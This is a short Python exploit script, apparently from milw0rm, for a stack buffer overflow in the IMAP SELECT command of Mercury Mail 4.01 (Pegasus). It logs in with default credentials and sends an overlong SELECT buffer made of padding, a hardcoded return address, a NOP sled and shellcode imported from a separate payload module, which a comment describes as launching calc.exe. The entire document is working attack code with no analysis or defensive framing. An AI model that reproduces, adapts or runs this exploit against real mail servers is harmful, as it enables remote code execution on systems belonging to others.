                                                                                                                                                                                                                                                               
#########################################################
#                                                       #
# Mercury Mail 4.01 (Pegasus) IMAP Buffer Overflow     	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# WWW.WHITEHAT.CO.IL                                    #
# Plain vanilla stack overflow in the SELECT command  	#
#                                                       #
#########################################################



from time import sleep
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Lame calc.exe shellcode - dont expect miracles!

   

    #Change RET Address as needed
    buffer = b'\x41'*260 +  struct.pack(b'<L', 0x782f28f7)+ b'\x90'*32+buf

    
    s.connect((target_machine,target_port))
    s.send(b'a001 LOGIN ftp ftp' + b'\r\n')
    data = s.recv(1024)
    sleep(3)
    s.send(b'A001 SELECT ' + buffer+b'\r\n')
    data = s.recv(1024)
    s.close()
    print("\nDone! ")

    # milw0rm.com [2004-11-29]